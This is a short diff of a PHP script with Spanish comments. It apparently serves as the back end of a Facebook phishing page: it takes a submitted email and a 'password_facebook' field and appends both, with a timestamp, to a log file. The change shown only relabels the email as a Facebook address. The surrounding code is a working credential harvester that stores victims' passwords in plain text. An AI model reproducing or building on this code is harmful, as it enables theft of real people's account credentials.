@@ -9,7 +9,7 @@ $password = $_POST['password_facebook'] ?? 'desconocida';
 $fecha = date("Y-m-d H:i:s");
 
 // Construye el texto a guardar y mostrar
-$log = "[$fecha] [📩] Correo: $email\n[$fecha] [🔑] Contraseña: $password\n\n";
+$log = "[$fecha] [📩] Correo (Facebook): $email\n[$fecha] [🔑] Contraseña: $password\n\n";
 
 // Guarda en archivo
 file_put_contents($file, $log, FILE_APPEND);
